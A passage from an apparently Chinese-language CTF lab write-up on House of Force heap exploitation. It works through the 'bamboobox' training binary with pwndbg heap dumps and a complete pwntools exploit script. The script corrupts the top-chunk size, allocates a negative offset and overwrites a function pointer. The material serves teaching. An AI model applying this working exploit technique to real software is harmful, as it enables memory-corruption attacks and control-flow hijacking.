function_">x7ffff7b04360</span> <span class="hljs-params">(__read_nocancel+<span class="hljs-number">7</span>)</span> ◂— cmp    rax, -0xfff<br>────────────────────────────────────────────[ DISASM ]─────────────────────────────────────────────<br> ► 0x7ffff7b04360 &lt;__read_nocancel+7&gt;     cmp    rax, -0xfff<br>   0x7ffff7b04366 &lt;__read_nocancel+13&gt;    jae    read+73 &lt;0x7ffff7b04399&gt;<br>    ↓<br>   0x7ffff7b04399 &lt;read+73&gt;               mov    rcx, qword ptr [rip + 0x2ccad8]<br>   0x7ffff7b043a0 &lt;read+80&gt;               neg    eax<br>   0x7ffff7b043a2 &lt;read+82&gt;               mov    dword ptr fs:[rcx], eax<br>   0x7ffff7b043a5 &lt;read+85&gt;               or     rax, 0xffffffffffffffff<br>   0x7ffff7b043a9 &lt;read+89&gt;               ret    <br> <br>   0x7ffff7b043aa                         nop    word ptr [rax + rax]<br>   0x7ffff7b043b0 &lt;write&gt;                 cmp    dword ptr [rip + 0x2d2389], 0 &lt;0x7ffff7dd6740&gt;<br>   0x7ffff7b043b7 &lt;write+7&gt;               jne    write+25 &lt;0x7ffff7b043c9&gt;<br>    ↓<br>   0x7ffff7b043c9 &lt;write+25&gt;              sub    rsp, 8<br>─────────────────────────────────────────────[ STACK ]─────────────────────────────────────────────<br>00:0000│ rsp  0x7fffffffdc28 —▸ 0<span class="hljs-title function_">x400e5d</span> <span class="hljs-params">(main+<span class="hljs-number">166</span>)</span> ◂— lea    rax, [rbp - 0x10]<br>01:0008│      0x7fffffffdc30 ◂— 0x200400ee0<br>02:0010│      0x7fffffffdc38 —▸ 0x603010 —▸ 0<span class="hljs-title function_">x400896</span> <span class="hljs-params">(hello_message)</span> ◂— push   rbp<br>03:0018│ rsi  0x7fffffffdc40 —▸ 0x7fffffff0a32 ◂— 0x0<br>04:0020│      0x7fffffffdc48 ◂— 0x2b1241ff949c6b00<br>05:0028│ rbp  0x7fffffffdc50 —▸ 0<span class="hljs-title function_">x400ee0</span> <span class="hljs-params">(__libc_csu_init)</span> ◂— push   r15<br>06:0030│      0x7fffffffdc58 —▸ 0<span class="hljs-title function_">x7ffff7a2d840</span> <span class="hljs-params">(__libc_start_main+<span class="hljs-number">240</span>)</span> ◂— mov    edi, eax<br>07:0038│      0x7fffffffdc60 ◂— 0x0<br>───────────────────────────────────────────[ BACKTRACE ]───────────────────────────────────────────<br> ► f 0     7ffff7b04360 __read_nocancel+7<br>   f 1           400e5d main+166<br>   f 2     7ffff7a2d840 __libc_start_main+240<br>Program received signal SIGINT<br>pwndbg&gt; <br><br></code></pre></td></tr></tbody></table></figure><p>ok，输入完成，接下来我们查看堆的分布</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c">pwndbg&gt; heap<br>Allocated chunk | PREV_INUSE<br>Addr: <span class="hljs-number">0x603000</span><br>Size: <span class="hljs-number">0x21</span><br><br>Allocated chunk | PREV_INUSE<br>Addr: <span class="hljs-number">0x603020</span><br>Size: <span class="hljs-number">0x21</span><br><br>Allocated chunk | PREV_INUSE<br>Addr: <span class="hljs-number">0x603040</span><br>Size: <span class="hljs-number">0x21</span><br><br>Top chunk | PREV_INUSE<br>Addr: <span class="hljs-number">0x603060</span><br>Size: <span class="hljs-number">0x20fa1</span><br><br>pwndbg&gt; <br></code></pre></td></tr></tbody></table></figure><p>堆的内存分布f</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c">pwndbg&gt; x/<span class="hljs-number">30</span>gx <span class="hljs-number">0x603000</span><br><span class="hljs-number">0x603000</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000021</span> #func_start_malloc_chunk<br><span class="hljs-number">0x603010</span>:<span class="hljs-number">0x0000000000400896</span><span class="hljs-number">0x00000000004008b1</span><br>#hello_message      #goodbye_message<br><span class="hljs-number">0x603020</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000021</span> #chunk0<br><span class="hljs-number">0x603030</span>:<span class="hljs-number">0x00000a6161616161</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x603040</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000021</span> #chunk1<br><span class="hljs-number">0x603050</span>:<span class="hljs-number">0x00000a6262626262</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x603060</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000020fa1</span> #top_chunk<br>......(省略内容均为空)<br><span class="hljs-number">0x6030e0</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br>pwndbg&gt; <br></code></pre></td></tr></tbody></table></figure><h3 id="全局变量"><a href="#全局变量" class="headerlink" title="全局变量"></a>全局变量</h3><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c">.bss:<span class="hljs-number">00000000006020</span>C0                 public itemlist<br>.bss:<span class="hljs-number">00000000006020</span>C0 ; item itemlist[<span class="hljs-number">100</span>]<br>.bss:<span class="hljs-number">00000000006020</span>C0 itemlist        item <span class="hljs-number">64</span>h <span class="hljs-title function_">dup</span><span class="hljs-params">(&lt;?&gt;)</span>       ; DATA XREF: add_item+A4↑o<br>.bss:<span class="hljs-number">0000000000602700</span>                 public num<br>.bss:<span class="hljs-number">0000000000602700</span> ; <span class="hljs-type">int</span> num<br>.bss:<span class="hljs-number">0000000000602700</span> num             dd ?                    ; DATA XREF: show_item+<span class="hljs-number">8</span>↑r<br></code></pre></td></tr></tbody></table></figure><ul><li><p>itemlist[] 记录着堆块的指针</p></li><li><p>num 记录着堆块的数量。</p></li></ul><p>查看一下堆指针信息</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c">pwndbg&gt; x/<span class="hljs-number">10</span>gx <span class="hljs-number">0x6020c0</span><br><span class="hljs-number">0x6020c0</span> &lt;itemlist&gt;:<span class="hljs-number">0x000000000000000a</span><span class="hljs-number">0x0000000000603030</span> #chunk0<br>#struct_size        #struct_content_ptr<br><span class="hljs-number">0x6020d0</span> &lt;itemlist+<span class="hljs-number">16</span>&gt;:<span class="hljs-number">0x0000000000000014</span><span class="hljs-number">0x0000000000603050</span> #chunk1<br>#struct_size        #struct_content_ptr<br><span class="hljs-number">0x6020e0</span> &lt;itemlist+<span class="hljs-number">32</span>&gt;:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x6020f0</span> &lt;itemlist+<span class="hljs-number">48</span>&gt;:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x602100</span> &lt;itemlist+<span class="hljs-number">64</span>&gt;:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br>pwndbg&gt; <br><span class="hljs-comment">//注意struct_content_ptr指向malloc出来malloc_data的地址</span><br></code></pre></td></tr></tbody></table></figure><p>保存着每一个chunk的 size（输入的大小） 和 chunk地址</p><h3 id="攻击原理及exp"><a href="#攻击原理及exp" class="headerlink" title="攻击原理及exp"></a>攻击原理及exp</h3><figure class="highlight py"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-comment">#!/usr/bin/env python</span><br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.log_level = <span class="hljs-string">'debug'</span><br>p = process(<span class="hljs-string">'./bamboobox'</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">cmd</span>(<span class="hljs-params">choice</span>):<br>  p.sendlineafter(<span class="hljs-string">''</span>,<span class="hljs-built_in">str</span>(choice))<br>  <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">create</span>(<span class="hljs-params">size,content</span>):<br>  cmd(<span class="hljs-number">2</span>)<br>  p.sendlineafter(<span class="hljs-string">'item name:'</span>,<span class="hljs-built_in">str</span>(size))<br>  p.sendlineafter(<span class="hljs-string">'item:'</span>,content)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">index,size,content</span>):<br>  cmd(<span class="hljs-number">3</span>)<br>  p.sendlineafter(<span class="hljs-string">'of item:'</span>,<span class="hljs-built_in">str</span>(index))<br>  p.sendlineafter(<span class="hljs-string">'item name:'</span>,<span class="hljs-built_in">str</span>(size))<br>  p.sendlineafter(<span class="hljs-string">'the item:'</span>,content)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">index</span>):<br>  cmd(<span class="hljs-number">4</span>)<br>  p.sendlineafter(<span class="hljs-string">'of item:'</span>,<span class="hljs-built_in">str</span>(index))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">quit</span>():<br>  cmd(<span class="hljs-number">5</span>)<br><br>magic = <span class="hljs-number">0x400d49</span><br>create(<span class="hljs-number">0x30</span>, <span class="hljs-string">"aaaa"</span>)<br>content=<span class="hljs-string">'a'</span>*<span class="hljs-number">0x30</span>+<span class="hljs-string">'1'</span>*<span class="hljs-number">8</span>+p64(<span class="hljs-number">0xffffffffffffffff</span>)<br>edit(<span class="hljs-number">0</span>,<span class="hljs-number">0x40</span>,content)<br>offset=-<span class="hljs-number">0x60</span>-<span class="hljs-number">0x10</span><br>create(offset,<span class="hljs-string">'bbbb'</span>)<br>create(<span class="hljs-number">0x10</span>,p64(magic)*<span class="hljs-number">2</span>)<br>quit()<br>p.interactive()<br></code></pre></td></tr></tbody></table></figure><h3 id="payload-分析"><a href="#payload-分析" class="headerlink" title="payload-分析"></a>payload 分析</h3><p>我们的目标是修改堆中的0x4008b1（goodbye_message）为magic函数地址：</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c">--------------------------------------------------------------------------<br>修改之前：<br>pwndbg&gt; x/<span class="hljs-number">30</span>gx <span class="hljs-number">0x603000</span><br><span class="hljs-number">0x603000</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000021</span> #func_start_malloc_chunk<br><span class="hljs-number">0x603010</span>:<span class="hljs-number">0x0000000000400896</span><span class="hljs-number">0x00000000004008b1</span><br>#hello_message      #goodbye_message<br>--------------------------------------------------------------------------<br>我们所期望的：<br>pwndbg&gt; x/<span class="hljs-number">30</span>gx <span class="hljs-number">0x603000</span><br><span class="hljs-number">0x603000</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000021</span> #func_start_malloc_chunk<br><span class="hljs-number">0x603010</span>:<span class="hljs-number">0x0000000000400896</span><span class="hljs-number">0x0000000000400d49</span><br>#hello_message      <span class="hljs-meta">#magic函数</span><br></code></pre></td></tr></tbody></table></figure><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs c">def <span class="hljs-title function_">cmd</span><span class="hljs-params">(choice)</span>:<br>  p.<span class="hljs-title function_">sendlineafter</span><span class="hljs-params">(<span class="hljs-string">'',str(choice))</span></span><br><span class="hljs-string"><span class="hljs-params">  </span></span><br><span class="hljs-string"><span class="hljs-params">def create(size,content):</span></span><br><span class="hljs-string"><span class="hljs-params">  cmd(2)</span></span><br><span class="hljs-string"><span class="hljs-params">  p.sendlineafter('</span>item name:<span class="hljs-string">',str(size))</span></span><br><span class="hljs-string"><span class="hljs-params">  p.sendlineafter('</span>item:<span class="hljs-string">',content)</span></span><br><span class="hljs-string"><span class="hljs-params"></span></span><br><span class="hljs-string"><span class="hljs-params">def edit(index,size,content):</span></span><br><span class="hljs-string"><span class="hljs-params">  cmd(3)</span></span><br><span class="hljs-string"><span class="hljs-params">  p.sendlineafter('</span>of item:<span class="hljs-string">',str(index))</span></span><br><span class="hljs-string"><span class="hljs-params">  p.sendlineafter('</span>item name:<span class="hljs-string">',str(size))</span></span><br><span class="hljs-string"><span class="hljs-params">  p.sendlineafter('</span>the item:<span class="hljs-string">',content)</span></span><br><span class="hljs-string"><span class="hljs-params"></span></span><br><span class="hljs-string"><span class="hljs-params">def delete(index):</span></span><br><span class="hljs-string"><span class="hljs-params">  cmd(4)</span></span><br><span class="hljs-string"><span class="hljs-params">  p.sendlineafter('</span>of item:<span class="hljs-string">',str(index))</span></span><br><span class="hljs-string"><span class="hljs-params"></span></span><br><span class="hljs-string"><span class="hljs-params">def quit():</span></span><br><span class="hljs-string"><span class="hljs-params">  cmd(5)</span></span><br></code></pre></td></tr></tbody></table></figure><p>首先来看第一部分的payload，这些代码的主要功能是自动化执行程序的功能。也是exp中最基础的部分，没有什么好说的。</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">create(<span class="hljs-number">0x30</span>, <span class="hljs-string">"aaaa"</span>)<br></code></pre></td></tr></tbody></table></figure><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs c">pwndbg&gt; vmmap<br>LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA<br>          <span class="hljs-number">0x400000</span>           <span class="hljs-number">0x402000</span> r-xp     <span class="hljs-number">2000</span> <span class="hljs-number">0</span>      /mnt/hgfs/PWN题/Range/ctfshow/ctf-pwn-challenges/heap/house-of-force/hitcontraning_lab11/bamboobox<br>          <span class="hljs-number">0x601000</span>           <span class="hljs-number">0x602000</span> r--p     <span class="hljs-number">1000</span> <span class="hljs-number">1000</span>   /mnt/hgfs/PWN题/Range/ctfshow/ctf-pwn-challenges/heap/house-of-force/hitcontraning_lab11/bamboobox<br>          <span class="hljs-number">0x602000</span>           <span class="hljs-number">0x603000</span> rw-p     <span class="hljs-number">1000</span> <span class="hljs-number">2000</span>   /mnt/hgfs/PWN题/Range/ctfshow/ctf-pwn-challenges/heap/house-of-force/hitcontraning_lab11/bamboobox<br>          <span class="hljs-number">0x603000</span>           <span class="hljs-number">0x624000</span> rw-p    <span class="hljs-number">21000</span> <span class="hljs-number">0</span>      [heap]<br>    <span class="hljs-number">0x7ffff7a0d000</span>     <span class="hljs-number">0x7ffff7bcd000</span> r-xp   <span class="hljs-number">1</span>c0000 <span class="hljs-number">0</span>      /lib/x86_64-linux-gnu/libc<span class="hljs-number">-2.23</span>.so<br>    <span class="hljs-number">0x7ffff7bcd000</span>     <span class="hljs-number">0x7ffff7dcd000</span> ---p   <span class="hljs-number">200000</span> <span class="hljs-number">1</span>c0000 /lib/x86_64-linux-gnu/libc<span class="hljs-number">-2.23</span>.so<br>    <span class="hljs-number">0x7ffff7dcd000</span>     <span class="hljs-number">0x7ffff7dd1000</span> r--p     <span class="hljs-number">4000</span> <span class="hljs-number">1</span>c0000 /lib/x86_64-linux-gnu/libc<span class="hljs-number">-2.23</span>.so<br>    <span class="hljs-number">0x7ffff7dd1000</span>     <span class="hljs-number">0x7ffff7dd3000</span> rw-p     <span class="hljs-number">2000</span> <span class="hljs-number">1</span>c4000 /lib/x86_64-linux-gnu/libc<span class="hljs-number">-2.23</span>.so<br>    <span class="hljs-number">0x7ffff7dd3000</span>     <span class="hljs-number">0x7ffff7dd7000</span> rw-p     <span class="hljs-number">4000</span> <span class="hljs-number">0</span>      <br>    <span class="hljs-number">0x7ffff7dd7000</span>     <span class="hljs-number">0x7ffff7dfd000</span> r-xp    <span class="hljs-number">26000</span> <span class="hljs-number">0</span>      /lib/x86_64-linux-gnu/ld<span class="hljs-number">-2.23</span>.so<br>    <span class="hljs-number">0x7ffff7fdc000</span>     <span class="hljs-number">0x7ffff7fdf000</span> rw-p     <span class="hljs-number">3000</span> <span class="hljs-number">0</span>      <br>    <span class="hljs-number">0x7ffff7ff7000</span>     <span class="hljs-number">0x7ffff7ffa000</span> r--p     <span class="hljs-number">3000</span> <span class="hljs-number">0</span>      [vvar]<br>    <span class="hljs-number">0x7ffff7ffa000</span>     <span class="hljs-number">0x7ffff7ffc000</span> r-xp     <span class="hljs-number">2000</span> <span class="hljs-number">0</span>      [vdso]<br>    <span class="hljs-number">0x7ffff7ffc000</span>     <span class="hljs-number">0x7ffff7ffd000</span> r--p     <span class="hljs-number">1000</span> <span class="hljs-number">25000</span>  /lib/x86_64-linux-gnu/ld<span class="hljs-number">-2.23</span>.so<br>    <span class="hljs-number">0x7ffff7ffd000</span>     <span class="hljs-number">0x7ffff7ffe000</span> rw-p     <span class="hljs-number">1000</span> <span class="hljs-number">26000</span>  /lib/x86_64-linux-gnu/ld<span class="hljs-number">-2.23</span>.so<br>    <span class="hljs-number">0x7ffff7ffe000</span>     <span class="hljs-number">0x7ffff7fff000</span> rw-p     <span class="hljs-number">1000</span> <span class="hljs-number">0</span>      <br>    <span class="hljs-number">0x7ffffffde000</span>     <span class="hljs-number">0x7ffffffff000</span> rw-p    <span class="hljs-number">21000</span> <span class="hljs-number">0</span>      [<span class="hljs-built_in">stack</span>]<br><span class="hljs-number">0xffffffffff600000</span> <span class="hljs-number">0xffffffffff601000</span> r-xp     <span class="hljs-number">1000</span> <span class="hljs-number">0</span>      [vsyscall]<br><br></code></pre></td></tr></tbody></table></figure><p>执行完上面的payload之后堆块的状况如下：</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c">pwndbg&gt; x/<span class="hljs-number">30</span>gx <span class="hljs-number">0xe80000</span><br><span class="hljs-number">0xe80000</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000021</span> #func_start_malloc_chunk<br><span class="hljs-number">0xe80010</span>:<span class="hljs-number">0x0000000000400896</span><span class="hljs-number">0x00000000004008b1</span><br>    #hello_message      #goodbye_message<br><span class="hljs-number">0xe80020</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000041</span> #chunk0（<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x30</span>)）<br><span class="hljs-number">0xe80030</span>:<span class="hljs-number">0x0000000a61616161</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0xe80040</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0xe80050</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0xe80060</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000020fa1</span> #top_chunk<br><span class="hljs-number">0xe80070</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0xe80080</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0xe80090</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0xe800a0</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0xe800b0</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0xe800c0</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0xe800d0</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0xe800e0</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br>pwndbg&gt; <br></code></pre></td></tr></tbody></table></figure><p>然后我们编辑刚才创建的堆块（index0）：</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">content=<span class="hljs-string">'a'</span>*<span class="hljs-number">0x30</span>+<span class="hljs-string">'1'</span>*<span class="hljs-number">8</span>+p64(<span class="hljs-number">0xffffffffffffffff</span>)<br>edit(<span class="hljs-number">0</span>,<span class="hljs-number">0x40</span>,content)<br></code></pre></td></tr></tbody></table></figure><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c">pwndbg&gt; x/<span class="hljs-number">30</span>gx <span class="hljs-number">0xe80000</span><br><span class="hljs-number">0xe80000</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000021</span> #func_start_malloc_chunk<br><span class="hljs-number">0xe80010</span>:<span class="hljs-number">0x0000000000400896</span><span class="hljs-number">0x00000000004008b1</span><br>    #hello_message      #goodbye_message<br><span class="hljs-number">0xe80020</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000041</span> #chunk0（<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x30</span>)）<br><span class="hljs-number">0xe80030</span>:<span class="hljs-number">0x6161616161616161</span><span class="hljs-number">0x6161616161616161</span><br><span class="hljs-number">0xe80040</span>:<span class="hljs-number">0x6161616161616161</span><span class="hljs-number">0x6161616161616161</span><br><span class="hljs-number">0xe80050</span>:<span class="hljs-number">0x6161616161616161</span><span class="hljs-number">0x6161616161616161</span><br><span class="hljs-number">0xe80060</span>:<span class="hljs-number">0x3131313131313131</span><span class="hljs-number">0xffffffffffffffff</span> #top_chunk<br><span class="hljs-number">0xe80070</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br>......（省略内容均为空）<br><span class="hljs-number">0xe800e0</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br>pwndbg&gt; <br></code></pre></td></tr></tbody></table></figure><p>从上面的内容可以看到，top_chunk的size已经被更改为0xffffffffffffffff，利用它我们就可以控制任意内存的地址。继续向下看paylaod：</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">offset=-<span class="hljs-number">0x60</span>-<span class="hljs-number">0x10</span><br>create(offset,<span class="hljs-string">'bbbb'</span>)<br></code></pre></td></tr></tbody></table></figure><p>这个offset怎么来的？</p><p>首先要明确目标为修改goodbye_message函数为magic函数。在gdb调试中，goodbye_message函数指针的地址为：0xe80010，现在的top_chunk地址为0xe80060</p><p>要想修改地址，应该将 top_chunk 指向0xe80000（heap_base）处，这样当下次再分配chunk时，就可以分配到goodbye_message处的内存了。</p><p>如何计算？本题是向低地址移动，将上一小节的公式带入到本题中：</p><p>malloc_size=0xe80000-0xe80060-0x10=-0x70</p><p>因此要malloc(-0x70)，完成此步骤之后堆内存如下图所示：</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c">pwndbg&gt; x/<span class="hljs-number">30</span>gx <span class="hljs-number">0xe80000</span><br><span class="hljs-number">0xe80000</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000059</span> #new_top_chunk<br><span class="hljs-number">0xe80010</span>:<span class="hljs-number">0x0000000000400896</span><span class="hljs-number">0x00000000004008b1</span><br>    #hello_message      #goodbye_message<br><span class="hljs-number">0xe80020</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000041</span> #chunk0（<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x30</span>)）<br><span class="hljs-number">0xe80030</span>:<span class="hljs-number">0x6161616161616161</span><span class="hljs-number">0x6161616161616161</span><br><span class="hljs-number">0xe80040</span>:<span class="hljs-number">0x6161616161616161</span><span class="hljs-number">0x6161616161616161</span><br><span class="hljs-number">0xe80050</span>:<span class="hljs-number">0x6161616161616161</span><span class="hljs-number">0x6161616161616161</span><br><span class="hljs-number">0xe80060</span>:<span class="hljs-number">0x3131313131313131</span><span class="hljs-number">0xffffffffffffffa1</span> #old_top_chunk<br><span class="hljs-number">0xe80070</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br>......（省略内容均为空）<br><span class="hljs-number">0xe800e0</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br>pwndbg&gt; <br></code></pre></td></tr></tbody></table></figure><p>此时已经可以控制goodbye_message的地址，覆盖后退出程序就可以触发magic函数。</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">create(<span class="hljs-number">0x10</span>,p64(magic)*<span class="hljs-number">2</span>)<br></code></pre></td></tr></tbody></table></figure><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c">pwndbg&gt; x/<span class="hljs-number">30</span>gx <span class="hljs-number">0xe80000</span><br><span class="hljs-number">0xe80000</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000021</span> #现在已经被控制的chunk<br><span class="hljs-number">0xe80010</span>:<span class="hljs-number">0x0000000000400d49</span><span class="hljs-number">0x0000000000400d49</span><br>    #hello_message      <span class="hljs-meta">#magic</span><br><span class="hljs-number">0xe80020</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000039</span> #chunk0（<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x30</span>)）<br><span class="hljs-number">0xe80030</span>:<span class="hljs-number">0x6161616161616161</span><span class="hljs-number">0x6161616161616161</span><br><span class="hljs-number">0xe80040</span>:<span class="hljs-number">0x6161616161616161</span><span class="hljs-number">0x6161616161616161</span><br><span class="hljs-number">0xe80050</span>:<span class="hljs-number">0x6161616161616161</span><span class="hljs-number">0x6161616161616161</span><br><span class="hljs-number">0xe80060</span>:<span class="hljs-number">0x3131313131313131</span><span 